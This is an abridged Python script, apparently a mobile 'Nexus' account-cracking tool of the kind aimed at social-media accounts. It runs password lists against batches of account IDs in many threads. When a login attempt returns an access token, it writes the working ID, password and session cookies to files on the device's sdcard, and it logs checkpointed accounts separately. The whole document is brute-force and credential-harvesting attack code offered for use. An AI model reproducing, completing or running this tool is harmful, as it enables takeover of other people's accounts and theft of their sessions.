...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/Nexus-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/Nexus-CP.txt{W}")
...
class Akash:
    def nepal():
        ...
        with tred(max_workers=35) as My_Tanisha:
            ...
            clear()
            print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/Nexus.txt{W}")
            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/Nexus-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[Nexus.>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[Nexus.-OK] {ids} | {pas}')
                open('/sdcard/Nexus.-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[Nexus.>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[Nexus.-OK] {uid} | {pas}')
                open('/sdcard/Nexus.-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
                ...
                open('/sdcard/Nexus.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
